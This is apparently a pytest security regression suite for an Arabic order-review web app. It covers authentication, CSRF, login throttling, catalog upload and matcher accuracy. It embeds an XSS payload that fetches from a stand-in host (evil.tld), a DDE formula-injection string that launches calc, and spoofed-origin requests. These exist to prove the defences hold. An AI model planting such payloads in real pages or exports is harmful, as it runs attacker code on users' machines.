"""Security, catalog-onboarding, and hardening regression tests.

Every test here corresponds to a defect that was reproduced against the previous
build. They exist so those defects cannot come back silently.
"""

from __future__ import annotations

import csv
import io
import os
import sqlite3

import pytest
from fastapi.testclient import TestClient

import app.main as main_module
from app import database
from app.catalog import CatalogError, parse_catalog_bytes
from app.extractor import _build_result, _is_transient, _parse_json_response
from app.main import create_app
from app.models import ExtractedItem, ExtractionResult
from app.security import bind_actor, csv_safe, load_auth_config
from tests.helpers import TEST_PASSWORD, login

XSS_PAYLOAD = '<img src=x onerror="fetch(\'//evil.tld\')">'
CSV_PAYLOAD = "=cmd|' /C calc'!A0"


class StubExtractor:
    """Echoes an attacker-controlled raw_text into the pipeline."""

    def __init__(self, raw_text: str = "6 فلاش ليمون", description: str = "فلاش ليمون"):
        self.raw_text = raw_text
        self.description = description

    def extract(self, message: str) -> ExtractionResult:
        return ExtractionResult(
            items=[
                ExtractedItem(
                    raw_text=self.raw_text,
                    product_description=self.description,
                    quantity=6.0,
                    unit="قطعة",
                )
            ],
            unresolved_text=[],
        )


@pytest.fixture
def client(tmp_path, monkeypatch):
    db_path = tmp_path / "orders.db"
    database.init_db(db_path)
    monkeypatch.setattr(main_module, "extractor", StubExtractor())
    with TestClient(create_app(db_path)) as test_client:
        yield test_client, db_path


@pytest.fixture
def signed_in(client):
    test_client, db_path = client
    login(test_client, "reviewer")
    return test_client, db_path


def _full_cycle(test_client, message="ابعتلي 6 فلاش ليمون", actor="reviewer"):
    order = test_client.post("/api/process", json={"message": message}).json()
    item_id = order["items"][0]["id"]
    review = test_client.post(
        f"/api/orders/{order['order_id']}/items/{item_id}/review",
        json={
            "actor": actor,
            "action_id": f"review-{order['order_id']}",
            "final_decision": "SELECT",
            "selected_sku": "CL010",
            "quantity": 6,
            "unit": "قطعة",
        },
    )
    assert review.status_code == 200, review.text
    approval = test_client.post(
        f"/api/orders/{order['order_id']}/approve",
        json={"actor": actor, "action_id": f"approve-{order['order_id']}"},
    )
    assert approval.status_code == 200, approval.text
    return order["order_id"]


# ---------------------------------------------------------------------------
# Authentication
# ---------------------------------------------------------------------------


PROTECTED = [
    ("post", "/api/process", {"json": {"message": "x"}}),
    ("get", "/api/orders", {}),
    ("get", "/api/orders/1", {}),
    ("get", "/api/orders/1/audit", {}),
    ("post", "/api/orders/1/export", {}),
    ("get", "/api/catalog", {}),
    ("get", "/api/catalog/info", {}),
    ("get", "/api/catalog/template", {}),
    ("post", "/api/orders/1/approve", {"json": {"actor": "a", "action_id": "b"}}),
    (
        "post",
        "/api/orders/1/items/1/review",
        {
            "json": {
                "actor": "a",
                "action_id": "b",
                "final_decision": "SELECT",
                "selected_sku": "CL010",
                "quantity": 1,
                "unit": "قطعة",
            }
        },
    ),
]


@pytest.mark.parametrize("method,path,kwargs", PROTECTED)
def test_every_data_endpoint_requires_authentication(client, method, path, kwargs):
    test_client, _ = client
    response = getattr(test_client, method)(path, **kwargs)
    assert response.status_code == 401, f"{method.upper()} {path} -> {response.status_code}"


def test_health_and_login_stay_public(client):
    test_client, _ = client
    assert test_client.get("/api/health").status_code == 200
    assert test_client.get("/login").status_code == 200


def test_security_headers_cover_public_and_authenticated_pages(client):
    test_client, _ = client
    for path in ("/api/health", "/login"):
        response = test_client.get(path)
        assert response.headers["cache-control"] == "no-store"
        assert response.headers["x-content-type-options"] == "nosniff"
        assert response.headers["x-frame-options"] == "DENY"
        assert response.headers["referrer-policy"] == "no-referrer"
        assert response.headers["cross-origin-opener-policy"] == "same-origin"
        assert "frame-ancestors 'none'" in response.headers["content-security-policy"]


def test_root_redirects_to_login_when_signed_out(client):
    test_client, _ = client
    response = test_client.get("/", follow_redirects=False)
    assert response.status_code == 303
    assert response.headers["location"] == "/login"


def test_wrong_password_is_rejected(client):
    test_client, _ = client
    response = test_client.post(
        "/api/login", json={"operator": "reviewer", "password": "wrong"}
    )
    assert response.status_code == 401
    assert test_client.get("/api/session").json()["authenticated"] is False


def test_logout_clears_the_session(signed_in):
    test_client, _ = signed_in
    assert test_client.get("/api/session").json()["authenticated"] is True
    test_client.post("/api/logout")
    assert test_client.get("/api/session").json()["authenticated"] is False
    assert test_client.get("/api/orders").status_code == 401


def test_repeated_failed_logins_are_throttled(client):
    test_client, _ = client
    codes = {
        test_client.post(
            "/api/login", json={"operator": "attacker", "password": f"guess-{i}"}
        ).status_code
        for i in range(12)
    }
    assert 429 in codes, "brute-force attempts were never throttled"


# ---------------------------------------------------------------------------
# Actor binding: the audit identity comes from the session, not the body
# ---------------------------------------------------------------------------


def test_review_with_a_forged_actor_is_refused(signed_in):
    test_client, db_path = signed_in
    order = test_client.post("/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}).json()
    response = test_client.post(
        f"/api/orders/{order['order_id']}/items/{order['items'][0]['id']}/review",
        json={
            "actor": "someone-else@example.com",
            "action_id": "forged-1",
            "final_decision": "SELECT",
            "selected_sku": "CL010",
            "quantity": 6,
            "unit": "قطعة",
        },
    )
    assert response.status_code == 403
    stored = database.get_order_by_id(order["order_id"], db_path)["items"][0]
    assert not stored["is_human_confirmed"]
    assert stored["human_actor"] is None


def test_approval_with_a_forged_actor_is_refused(signed_in):
    test_client, db_path = signed_in
    order_id = _full_cycle(test_client)
    response = test_client.post(
        f"/api/orders/{order_id}/approve",
        json={"actor": "not-me", "action_id": "forged-approve"},
    )
    assert response.status_code == 403


def test_audit_records_the_authenticated_identity(signed_in):
    test_client, db_path = signed_in
    order_id = _full_cycle(test_client)
    events = database.get_order_by_id(order_id, db_path)["audit_events"]
    actors = {e["actor"] for e in events if e["actor"]}
    assert actors == {"reviewer"}


def test_bind_actor_unit_behaviour():
    assert bind_actor("", "ahmed") == "ahmed"
    assert bind_actor("ahmed", "ahmed") == "ahmed"
    with pytest.raises(Exception):
        bind_actor("mona", "ahmed")


# ---------------------------------------------------------------------------
# Output sanitisation
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value,expected",
    [
        ("=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"),
        ("+1234", "'+1234"),
        ("-SUM(A1)", "'-SUM(A1)"),
        ("@import", "'@import"),
        ("صابون سائل", "صابون سائل"),
        (12.5, 12.5),
        (None, None),
    ],
)
def test_csv_safe_neutralises_formula_prefixes(value, expected):
    assert csv_safe(value) == expected


def test_export_never_emits_a_live_formula_cell(client):
    test_client, _ = client
    main_module.extractor = StubExtractor(raw_text=CSV_PAYLOAD)
    login(test_client, "reviewer")
    order_id = _full_cycle(test_client, message=CSV_PAYLOAD)

    # Export records an audit event, so it must never be a state-changing GET.
    assert test_client.get(f"/api/orders/{order_id}/export").status_code == 405

    body = test_client.post(f"/api/orders/{order_id}/export").content.decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(body)))
    assert len(rows) >= 2
    for row in rows[1:]:
        for cell in row:
            assert not cell.startswith(("=", "+", "-", "@")), f"live formula cell: {cell!r}"
    assert "'" + CSV_PAYLOAD in body


def test_untrusted_text_is_stored_verbatim_and_never_pre_rendered(signed_in):
    """Order text is data, never markup.

    The previous version of this test asserted the payload was absent from the
    served page — which passes trivially, because the page is a static template
    and every order value arrives later by fetch. It would have passed with all
    escaping removed. The real proof is the browser test in
    ``tests/test_browser_xss.py``; what is checked here is the narrower,
    genuinely testable property: the API round-trips the payload byte-for-byte
    (no silent mangling) and the server never inlines it into HTML.
    """
    test_client, _ = signed_in
    main_module.extractor = StubExtractor(raw_text=XSS_PAYLOAD)
    order = test_client.post("/api/process", json={"message": XSS_PAYLOAD}).json()
    assert order["items"][0]["raw_text"] == XSS_PAYLOAD

    page = test_client.get("/").text
    assert XSS_PAYLOAD not in page
    assert order["original_message"] not in page, "order data must not be server-inlined"
    assert "function esc(" in page


def test_no_user_value_is_placed_inside_an_inline_event_handler():
    """``esc()`` is an HTML escaper and is a no-op in a JavaScript context.

    Product names and order text must therefore never reach an ``onclick=``
    attribute. Interactive rows carry ``data-*`` attributes and are wired with
    delegated listeners instead.
    """
    import re
    from pathlib import Path

    page = Path("app/templates/index.html").read_text(encoding="utf-8")
    handlers = re.findall(r'onclick="([^"]*)"', page)
    for handler in handlers:
        interpolations = re.findall(r"\$\{([^}]*)\}", handler)
        for expr in interpolations:
            assert re.fullmatch(r"esc\(\s*\w+\.id\s*\)|esc\(\s*\w+\.order_id\s*\)", expr.strip()), (
                f"inline handler interpolates a non-integer value: {handler}"
            )
    assert "data-sku" in page and "addEventListener" in page


def test_auth_coverage_is_derived_from_the_route_table_not_a_hardcoded_list(client):
    """Enumerate every route the app actually exposes and prove each is guarded.

    The hardcoded list this replaces is why ``/docs`` and ``/openapi.json`` were
    never noticed as publicly readable.
    """
    test_client, _ = client
    app = test_client.app
    public = {"/login", "/api/login", "/api/logout", "/api/session", "/api/health"}
    unguarded = []
    for route in app.routes:
        path = getattr(route, "path", None)
        methods = getattr(route, "methods", None) or set()
        if not path or path in public:
            continue
        probe = path.replace("{order_id}", "1").replace("{item_id}", "1")
        for method in ("GET", "POST", "PUT"):
            if method not in methods:
                continue
            response = getattr(test_client, method.lower())(
                probe, **({"json": {}} if method != "GET" else {}), follow_redirects=False
            )
            if response.status_code not in (401, 303, 405):
                unguarded.append(f"{method} {probe} -> {response.status_code}")
    assert not unguarded, f"routes reachable without a session: {unguarded}"


def test_interactive_api_docs_are_closed_by_default(client):
    test_client, _ = client
    for path in ("/docs", "/redoc", "/openapi.json", "/docs/oauth2-redirect"):
        assert test_client.get(path).status_code == 404, f"{path} is publicly readable"


# ---------------------------------------------------------------------------
# Catalog onboarding
# ---------------------------------------------------------------------------


CSV_UTF8 = (
    "product_id,product_name,aliases,unit,price\n"
    "P1,صابون سائل 1 لتر,صابون سايل|صابون ايد,قطعة,45.5\n"
    "P2,كلور مركز 4 لتر,كلوركس مركز,جركن,35\n"
)

CSV_ARABIC_HEADERS = (
    "كود المنتج,اسم المنتج,الوحدة,السعر\n"
    "A1,مناديل مطبخ,رول,20\n"
    "A2,أكياس قمامة كبيرة,كيس,15\n"
)


def test_upload_replaces_catalog_and_rebuilds_matcher(signed_in):
    test_client, _ = signed_in
    response = test_client.post(
        "/api/catalog/upload",
        files={"file": ("my_products.csv", CSV_UTF8.encode("utf-8"), "text/csv")},
    )
    assert response.status_code == 200, response.text
    result = response.json()
    assert result["product_count"] == 2
    assert result["source_name"] == "my_products.csv"

    catalog = test_client.get("/api/catalog").json()
    assert [p["product_id"] for p in catalog] == ["P1", "P2"]
    assert catalog[0]["aliases"] == ["صابون سايل", "صابون ايد"]
    assert test_client.get("/api/catalog/info").json()["product_count"] == 2


def test_upload_accepts_arabic_headers_and_missing_alias_column(signed_in):
    test_client, _ = signed_in
    response = test_client.post(
        "/api/catalog/upload",
        files={"file": ("اصنافي.csv", CSV_ARABIC_HEADERS.encode("utf-8"), "text/csv")},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["product_count"] == 2
    assert any("مرادفات" in w for w in body["warnings"])


def test_upload_accepts_windows_1256_encoding(signed_in):
    """Excel on an Arabic Windows machine exports cp1256, not UTF-8."""
    test_client, _ = signed_in
    response = test_client.post(
        "/api/catalog/upload",
        files={"file": ("legacy.csv", CSV_UTF8.encode("cp1256"), "text/csv")},
    )
    assert response.status_code == 200, response.text
    assert response.json()["detected_encoding"] == "cp1256"
    assert test_client.get("/api/catalog").json()[0]["product_name"] == "صابون سائل 1 لتر"


@pytest.mark.parametrize(
    "payload,fragment",
    [
        (b"", "فارغ"),
        (b"a,b,c\n1,2,3\n", "كود"),
        ("product_id,product_name\nX,اسم\nX,اسم تاني\n".encode(), "مكرر"),
        ("product_id,product_name\n,\n,\n".encode(), "صالح"),
    ],
)
def test_bad_catalog_files_are_rejected_with_a_readable_reason(payload, fragment):
    with pytest.raises(CatalogError) as excinfo:
        parse_catalog_bytes(payload, "bad.csv")
    assert fragment in str(excinfo.value)


def test_upload_rejects_bad_file_with_400(signed_in):
    test_client, _ = signed_in
    response = test_client.post(
        "/api/catalog/upload", files={"file": ("junk.csv", b"a,b\n1,2\n", "text/csv")}
    )
    assert response.status_code == 400
    assert "كود" in response.json()["detail"]


def test_replacing_the_catalog_does_not_rewrite_approved_history(signed_in):
    test_client, db_path = signed_in
    order_id = _full_cycle(test_client)
    before = test_client.post(f"/api/orders/{order_id}/export").content

    assert (
        test_client.post(
            "/api/catalog/upload",
            files={"file": ("new.csv", CSV_UTF8.encode("utf-8"), "text/csv")},
        ).status_code
        == 200
    )

    snapshot = database.get_order_by_id(order_id, db_path)["approved_items"][0]
    assert snapshot["product_id"] == "CL010"
    assert snapshot["product_name"]  # name captured at approval time survives
    after = test_client.post(f"/api/orders/{order_id}/export").content
    # Only the export timestamp/count differ; product rows must be identical.
    assert b"CL010" in after and b"CL010" in before


def test_process_is_blocked_when_the_catalog_is_empty(tmp_path, monkeypatch):
    db_path = tmp_path / "empty.db"
    database.init_db(db_path)
    monkeypatch.setattr(main_module, "extractor", StubExtractor())
    monkeypatch.setattr("app.main._seed_catalog_if_empty", lambda _path: None)
    with TestClient(create_app(db_path)) as test_client:
        login(test_client, "reviewer")
        response = test_client.post("/api/process", json={"message": "x"})
        assert response.status_code == 409
        assert "كتالوج" in response.json()["detail"]


# ---------------------------------------------------------------------------
# Persistence hardening
# ---------------------------------------------------------------------------


def test_session_closes_the_connection(tmp_path):
    db_path = tmp_path / "close.db"
    database.init_db(db_path)
    with database.session(db_path) as conn:
        conn.execute("SELECT 1")
    with pytest.raises(sqlite3.ProgrammingError):
        conn.execute("SELECT 1")


def test_session_rolls_back_on_error(tmp_path):
    db_path = tmp_path / "rollback.db"
    database.init_db(db_path)
    with pytest.raises(RuntimeError):
        with database.session(db_path) as conn:
            conn.execute(
                "INSERT INTO orders (original_text, status, processing_time_ms, created_at, updated_at)"
                " VALUES ('x','needs_review',0,'t','t')"
            )
            raise RuntimeError("boom")
    with database.session(db_path) as conn:
        assert conn.execute("SELECT COUNT(*) FROM orders").fetchone()[0] == 0


def test_accepting_the_model_recommendation_records_no_false_correction(signed_in):
    """The corrections table is the learning signal; it must stay clean."""
    test_client, db_path = signed_in
    order = test_client.post("/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}).json()
    item = order["items"][0]
    assert item["recommended_product"]["product_id"] == "CL010"

    test_client.post(
        f"/api/orders/{order['order_id']}/items/{item['id']}/review",
        json={
            "actor": "reviewer",
            "action_id": "accept-as-is",
            "final_decision": "SELECT",
            "selected_sku": item["recommended_product"]["product_id"],
            "quantity": item["extracted_quantity"],
            "unit": item["extracted_unit"],
        },
    )
    corrections = database.get_order_by_id(order["order_id"], db_path)["corrections"]
    assert corrections == [], f"accepting the model as-is wrote {corrections}"


def test_overriding_the_model_records_a_real_correction(signed_in):
    test_client, db_path = signed_in
    order = test_client.post("/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}).json()
    item = order["items"][0]

    test_client.post(
        f"/api/orders/{order['order_id']}/items/{item['id']}/review",
        json={
            "actor": "reviewer",
            "action_id": "override-1",
            "final_decision": "SELECT",
            "selected_sku": "CL009",
            "quantity": 9,
            "unit": "كرتونة",
        },
    )
    corrections = database.get_order_by_id(order["order_id"], db_path)["corrections"]
    fields = {c["field_name"]: (c["old_value"], c["new_value"]) for c in corrections}
    assert fields["product_id"] == ("CL010", "CL009")
    assert fields["quantity"][1] == "9.0"
    assert fields["unit"][1] == "كرتونة"


# ---------------------------------------------------------------------------
# Honest metrics
# ---------------------------------------------------------------------------


def test_no_saving_is_claimed_before_approval(signed_in):
    test_client, _ = signed_in
    order = test_client.post("/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}).json()
    timing = order["time_saved"]
    assert timing["saved_seconds"] is None
    assert timing["is_measured"] is False


def test_saving_is_measured_after_approval(signed_in):
    test_client, _ = signed_in
    order_id = _full_cycle(test_client)
    timing = test_client.get(f"/api/orders/{order_id}").json()["time_saved"]
    assert timing["is_measured"] is True
    assert timing["review_cycle_seconds"] is not None
    assert timing["saved_seconds"] is not None


# ---------------------------------------------------------------------------
# Extractor resilience
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "error,expected",
    [
        (RuntimeError("429 RESOURCE_EXHAUSTED"), True),
        (RuntimeError("503 Service Unavailable"), True),
        (TimeoutError("deadline exceeded"), True),
        (ValueError("invalid api key"), False),
        (ValueError("model not found"), False),
    ],
)
def test_transient_error_classification(error, expected):
    assert _is_transient(error) is expected


def test_malformed_model_output_is_tolerated():
    parsed = _parse_json_response('```json\n{"items": [], "unresolved_text": "x"}\n```')
    result = _build_result(parsed)
    assert result.items == []
    assert result.unresolved_text == ["x"]


def test_items_without_a_description_are_dropped():
    result = _build_result(
        {"items": [{"product_description": "", "quantity": 2}, {"product_description": "بريل"}]}
    )
    assert len(result.items) == 1
    assert result.items[0].quantity == 1.0


@pytest.mark.parametrize("bad", [None, "abc", -3, 0, float("nan")])
def test_invalid_quantities_fall_back_to_one(bad):
    result = _build_result({"items": [{"product_description": "بريل", "quantity": bad}]})
    assert result.items[0].quantity == 1.0


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------


def test_auth_config_generates_a_password_when_none_is_set():
    config = load_auth_config({})
    assert config.generated_password is True
    assert config.shared_password
    assert not config.verify("a", "")
    assert config.verify("a", config.shared_password)


def test_named_accounts_are_isolated():
    config = load_auth_config({"APP_USERS": "ahmed:pw1, mona:pw2"})
    assert config.verify("ahmed", "pw1")
    assert not config.verify("ahmed", "pw2")
    assert not config.verify("ghost", "pw1")


def test_malformed_app_users_is_rejected_loudly():
    with pytest.raises(ValueError):
        load_auth_config({"APP_USERS": "ahmed"})


def test_shared_password_from_env_is_used():
    config = load_auth_config({"APP_PASSWORD": TEST_PASSWORD})
    assert config.generated_password is False
    assert config.verify("anyone", TEST_PASSWORD)


# ---------------------------------------------------------------------------
# Ambiguity handling: surface the best candidate, warn instead of hiding
# ---------------------------------------------------------------------------


AMBIGUOUS_CATALOG = (
    "product_id,product_name,aliases,unit,price\n"
    "S1,أرز مصري 5 كيلو الضحى,رز الضحى 5 كيلو,كيس,320\n"
    "S2,أرز مصري 1 كيلو الضحى,رز الضحى كيلو,كيس,68\n"
)


class RiceExtractor:
    def extract(self, message: str) -> ExtractionResult:
        return ExtractionResult(
            items=[
                ExtractedItem(
                    raw_text="5 شكاير رز الضحى 5 كيلو",
                    product_description="رز الضحى 5 كيلو",
                    quantity=5,
                    unit="كيس",
                )
            ],
            unresolved_text=[],
        )


def test_ambiguous_line_still_carries_its_best_candidate(signed_in, monkeypatch):
    """A close size variant must not blank the suggestion the matcher ranked first."""
    test_client, _ = signed_in
    assert (
        test_client.post(
            "/api/catalog/upload",
            files={"file": ("rice.csv", AMBIGUOUS_CATALOG.encode("utf-8"), "text/csv")},
        ).status_code
        == 200
    )
    monkeypatch.setattr(main_module, "extractor", RiceExtractor())

    item = test_client.post("/api/process", json={"message": "رز"}).json()["items"][0]

    assert item["confidence"] >= 0.85
    assert item["recommendation_decision"] == "REVIEW", "close variants must route to review"
    assert item["recommended_product"] is not None, "the best candidate must still be shown"
    assert item["recommended_product"]["product_id"] == "S1"
    assert item["is_human_confirmed"] is False


def test_unambiguous_line_is_marked_select(signed_in):
    test_client, _ = signed_in
    item = test_client.post(
        "/api/process", json={"message": "ابعتلي 6 فلاش ليمون"}
    ).json()["items"][0]
    assert item["recommendation_decision"] == "SELECT"
    assert item["recommended_product"]["product_id"] == "CL010"


def test_bulk_confirm_is_limited_to_select_lines_in_the_ui():
    """The batch button must never rubber-stamp an ambiguous line."""
    from pathlib import Path

    page = Path("app/templates/index.html").read_text(encoding="utf-8")
    assert "i.recommendation_decision === 'SELECT'" in page
    assert "تأكيد السطور الأكيدة" in page


# ---------------------------------------------------------------------------
# Findings from the independent audit round
# ---------------------------------------------------------------------------


def test_login_throttle_survives_x_forwarded_for_spoofing(client):
    """Rotating X-Forwarded-For must not buy unlimited password guesses.

    The address header is attacker-controlled unless a trusted proxy sets it, and
    the deployment ran uvicorn with --forwarded-allow-ips='*'. Failures are now
    counted per account as well as per address.
    """
    test_client, _ = client
    codes = [
        test_client.post(
            "/api/login",
            json={"operator": "victim", "password": f"guess-{i}"},
            headers={"X-Forwarded-For": f"10.0.0.{i}"},
        ).status_code
        for i in range(14)
    ]
    assert 429 in codes, f"never throttled across spoofed addresses: {codes}"
    # And the throttle must bite even with the correct password.
    blocked = test_client.post(
        "/api/login",
        json={"operator": "victim", "password": TEST_PASSWORD},
        headers={"X-Forwarded-For": "10.0.0.99"},
    )
    assert blocked.status_code == 429


def test_cross_site_state_change_is_rejected(client):
    """SameSite=Lax is not a CSRF defence on its own.

    "Same site" ignores the port, so a page on another port of the same host —
    and any sibling subdomain in production — is same-site and its cookies ride
    along. A multipart POST is CORS-safelisted, so it arrives with no preflight.
    """
    test_client, _ = client
    login(test_client, "reviewer")
    before = len(test_client.get("/api/catalog").json())

    response = test_client.post(
        "/api/catalog/upload",
        files={"file": ("evil.csv", b"product_id,product_name\nEVIL,PWNED\n", "text/csv")},
        headers={"Origin": "http://evil.example:9999"},
    )
    assert response.status_code == 403, "cross-site catalog replacement was accepted"
    assert len(test_client.get("/api/catalog").json()) == before

    same_site = test_client.post(
        "/api/catalog/upload",
        files={"file": ("ok.csv", b"product_id,product_name\nOK1,fine\n", "text/csv")},
        headers={"Origin": "http://testserver"},
    )
    assert same_site.status_code == 200, "same-origin upload must still work"


@pytest.mark.parametrize("origin", ["null", "https://testserver"])
def test_opaque_or_cross_scheme_origin_is_rejected(client, origin):
    test_client, _ = client
    login(test_client, "reviewer")
    response = test_client.post(
        "/api/catalog/upload",
        files={"file": ("catalog.csv", b"product_id,product_name\nOK1,fine\n", "text/csv")},
        headers={"Origin": origin},
    )
    assert response.status_code == 403


def test_read_only_uri_survives_special_characters(tmp_path):
    """A '#' or '?' in the path must not silently open a phantom database.

    Both callers of the read-only URI are safety checks: a phantom database means
    the legacy-schema guard passes for the wrong file and the migration preflight
    reports nothing to migrate.
    """
    folders = ["we#ird", "qu?ery", "Project @", "100%done", "مشاريع"]
    # Windows reserves '?' in file names, so it cannot create the fixture needed
    # to exercise that URI case. Keep the remaining real-path encoding coverage
    # here; POSIX continues to cover '?' as well.
    if os.name == "nt":
        folders.remove("qu?ery")
    for folder in folders:
        directory = tmp_path / folder
        directory.mkdir()
        path = directory / "orders.db"
        database.init_db(path)
        with database.session(path) as conn:
            conn.execute(
                "INSERT INTO schema_migrations (migration_id, applied_at) VALUES ('probe','t')"
            )
        conn = sqlite3.connect(database._read_only_uri(str(path)), uri=True)
        try:
            found = conn.execute(
                "SELECT COUNT(*) FROM schema_migrations WHERE migration_id='probe'"
            ).fetchone()[0]
        finally:
            conn.close()
        assert found == 1, f"read-only URI opened the wrong database for {folder!r}"


def test_legacy_schema_guard_is_not_bypassed_by_a_hash_in_the_path(tmp_path):
    directory = tmp_path / "we#ird"
    directory.mkdir()
    path = directory / "orders.db"
    conn = sqlite3.connect(path)
    conn.executescript(
        """
        CREATE TABLE orders(id INTEGER PRIMARY KEY);
        CREATE TABLE order_items(id INTEGER PRIMARY KEY);
        CREATE TABLE approved_order_items(
            id INTEGER PRIMARY KEY,
            is_human_confirmed INTEGER NOT NULL DEFAULT 1
        );
        """
    )
    conn.commit()
    conn.close()
    assert database._unsafe_snapshot_schema_exists(path) is True
    with pytest.raises(RuntimeError, match="migration is required"):
        database.initialize_runtime_database(path)


def test_approved_order_renders_from_the_snapshot_not_the_live_catalog(signed_in):
    """Repricing the catalog must not change what an approved order displays."""
    test_client, _ = signed_in
    order_id = _full_cycle(test_client)
    before = test_client.get(f"/api/orders/{order_id}").json()["items"][0]["matched_product"]

    assert (
        test_client.post(
            "/api/catalog/upload",
            files={
                "file": (
                    "reprice.csv",
                    "product_id,product_name,unit,price\nCL010,اسم مختلف تماماً,برميل,9999\n".encode(),
                    "text/csv",
                )
            },
        ).status_code
        == 200
    )

    after = test_client.get(f"/api/orders/{order_id}").json()["items"][0]["matched_product"]
    assert after == before, "an approved line changed when the catalog was repriced"
    assert after["price"] != 9999


def test_order_message_length_is_bounded(signed_in):
    test_client, _ = signed_in
    assert test_client.post("/api/process", json={"message": "x" * 20_001}).status_code == 422


def test_utf16_catalog_is_accepted(signed_in):
    """Excel's "Unicode Text" export is UTF-16, which merchants do send."""
    test_client, _ = signed_in
    payload = "product_id,product_name,unit,price\nU1,منتج يونيكود,قطعة,10\n".encode("utf-16")
    response = test_client.post(
        "/api/catalog/upload", files={"file": ("unicode.csv", payload, "text/csv")}
    )
    assert response.status_code == 200, response.text
    assert response.json()["detected_encoding"] == "utf-16"
    assert test_client.get("/api/catalog").json()[0]["product_name"] == "منتج يونيكود"


def test_catalog_search_returns_a_bounded_shortlist(signed_in):
    """The review page asks the server instead of embedding the whole catalog."""
    test_client, _ = signed_in
    assert test_client.get("/api/catalog/search?q=").json() == []
    hits = test_client.get("/api/catalog/search?q=فلاش&limit=5").json()
    assert 0 < len(hits) <= 5
    assert all({"product_id", "product_name", "unit", "price"} <= set(h) for h in hits)
    by_code = test_client.get("/api/catalog/search?q=CL010").json()
    assert by_code[0]["product_id"] == "CL010"


def test_review_page_never_embeds_the_whole_catalog():
    from pathlib import Path

    page = Path("app/templates/index.html").read_text(encoding="utf-8")
    assert "catalogList" not in page, "the full catalog is being shipped to the browser again"
    assert "/api/catalog/search" in page


def test_prefilter_does_not_change_matcher_results(catalog):
    """The large-catalog prefilter must be an optimisation, never a behaviour change."""
    from app.matcher import ProductMatcher
    from app.models import CatalogProduct

    big = list(catalog) + [
        CatalogProduct(
            product_id=f"PAD{i:04d}",
            product_name=f"صنف حشو رقم {i} بحجم {i % 9 + 1} لتر",
            aliases=[f"حشو {i}"],
            unit="قطعة",
            price=float(i),
        )
        for i in range(400)
    ]
    queries = ["بريل كبير", "كلور مركز", "فلاش ليمون", "ديتول كبير", "كلوركص مركذ"]
    exhaustive = ProductMatcher(big)
    exhaustive._use_prefilter = False
    filtered = ProductMatcher(big)
    assert filtered._use_prefilter is True
    for query in queries:
        a = [c.product_id for c in exhaustive.find_candidates(query)]
        b = [c.product_id for c in filtered.find_candidates(query)]
        assert a == b, f"prefilter changed the result for {query!r}: {a} vs {b}"


def test_batch_confirmation_never_carries_a_wrong_pick():
    """The batch path is the one place a human does not look at each line.

    A size-aware relaxation of the ambiguity rule was measured and rejected: it
    made 24% of lines batch-eligible on a dense catalog, and 33% of those picks
    were the wrong product. This test locks in the calibration that matters —
    whatever the catalog, a line offered for batch confirmation must be right.
    """
    import csv as _csv
    from pathlib import Path

    from app.matcher import ProductMatcher
    from app.models import CatalogProduct, ExtractedItem

    hard = Path("evaluation/data/synthetic_catalog_400.csv")
    cases: list[tuple[list[CatalogProduct], list[tuple[str, str]]]] = []

    from app.catalog import load_catalog as _load

    cases.append(
        (
            _load(),
            [
                ("بريل كبير", "CL011"), ("كلور مركز", "CL004"), ("ديتول كبير", "CL006"),
                ("فلاش موف", "CL008"), ("فلاش اخضر", "CL009"), ("فلاش ليمون", "CL010"),
                ("صابون سايل كبير", "CL001"), ("بودرة غسيل", "CL003"),
            ],
        )
    )

    if hard.exists():
        rows = list(_csv.DictReader(hard.open(encoding="utf-8")))
        catalog = [
            CatalogProduct(
                product_id=r["product_id"],
                product_name=r["product_name"],
                aliases=[a for a in r["aliases"].split("|") if a.strip()],
                unit=r["unit"],
                price=float(r["price"]),
            )
            for r in rows
        ]
        queries = [(r["product_name"], r["product_id"]) for r in rows[:60]]
        cases.append((catalog, queries))

    for catalog, queries in cases:
        matcher = ProductMatcher(catalog)
        offered = wrong = 0
        for text, expected in queries:
            result = matcher.match_item(
                ExtractedItem(
                    raw_text=text, product_description=text, quantity=1, unit="قطعة"
                )
            )
            if result.status != "advisory_select":
                continue
            offered += 1
            picked = result.matched_product.product_id if result.matched_product else None
            if picked != expected:
                wrong += 1
        assert wrong == 0, (
            f"{wrong} of {offered} batch-eligible lines would confirm the wrong product "
            f"on a {len(catalog)}-SKU catalog"
        )
